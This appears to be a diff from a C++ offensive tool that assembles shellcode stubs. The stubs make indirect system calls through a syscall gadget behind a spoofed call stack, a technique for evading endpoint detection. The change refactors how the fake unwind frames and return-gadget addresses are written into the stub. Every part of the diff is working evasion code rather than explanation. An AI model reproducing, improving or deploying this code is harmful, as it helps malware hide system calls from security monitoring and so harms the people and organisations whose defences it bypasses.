@@ -94,33 +94,15 @@ void write_stack_args(ByteWriter& writer) {
 }
 
 void write_unwind_prologue(ByteWriter& writer) {
-    writer.write_u8(kPushRbpOpcode);
-    writer.write_bytes(kMovRbpRspOpcode);
-    writer.write_bytes(kSubRspOpcode);
-    writer.write_u32(static_cast<std::uint32_t>(kUnwindFrameSize));
-    writer.write_bytes(kSubRbpImm8Opcode);
-    writer.write_u8(static_cast<std::uint8_t>(kUnwindRbpBias));
+    writer.write_bytes(kSubRspImm8Opcode);
+    writer.write_u8(static_cast<std::uint8_t>(kUnwindFrameSize));
 }
 
-void write_unwind_slot(ByteWriter& writer, std::uint64_t gadget) {
-    write_mov_rax(writer, gadget);
-    writer.write_bytes(kStoreRaxAtRspOpcode);
-}
-
-void write_unwind_record(
-    ByteWriter& writer,
-    std::size_t index,
-    std::uint64_t return_gadget) {
-    const auto record_offset = index * kUnwindFrameStep;
-    const auto saved_offset = record_offset + kUnwindFrameStep;
-    writer.write_bytes(kLeaRaxRbpDisp8Opcode);
-    writer.write_u8(static_cast<std::uint8_t>(saved_offset));
-    writer.write_bytes(kStoreRaxAtRbpDisp8Opcode);
-    writer.write_u8(static_cast<std::uint8_t>(record_offset));
-    write_mov_rax(writer, return_gadget);
-    writer.write_bytes(kStoreRaxAtRbpDisp8Opcode);
-    writer.write_u8(
-        static_cast<std::uint8_t>(record_offset + sizeof(std::uint64_t)));
+void write_unwind_slots(ByteWriter& writer, const UnwindSpoofAddresses& addresses) {
+    for (std::size_t index = 0; index < kUnwindFrameCount; ++index) {
+        write_mov_rax(writer, addresses.frames[index]);
+        write_store_rax(writer, index * sizeof(std::uint64_t));
+    }
 }
 
 void write_unwind_args(ByteWriter& writer) {
@@ -175,10 +157,7 @@ std::array<std::uint8_t, kUnwindStubSize> assemble_unwind_spoofed(
     std::array<std::uint8_t, kUnwindStubSize> stub{};
     ByteWriter writer(stub);
     write_unwind_prologue(writer);
-    write_unwind_slot(writer, addresses.frames[0]);
-    for (std::size_t index = 0; index < kUnwindFrameCount; ++index) {
-        write_unwind_record(writer, index, addresses.frames[index + 1]);
-    }
+    write_unwind_slots(writer, addresses);
     write_unwind_args(writer);
     write_syscall_prefix(writer, ssn);
     write_indirect_jump(writer, syscall_gadget);
